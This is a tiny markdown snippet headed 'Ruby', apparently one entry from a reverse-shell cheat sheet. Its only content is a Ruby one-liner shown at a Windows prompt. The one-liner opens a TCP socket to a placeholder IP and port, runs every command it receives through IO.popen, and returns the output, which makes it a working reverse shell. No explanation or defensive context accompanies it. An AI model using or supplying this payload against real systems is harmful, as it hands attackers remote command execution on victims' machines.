# Ruby

```ruby
C:\> ruby -rsocket -e 'c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```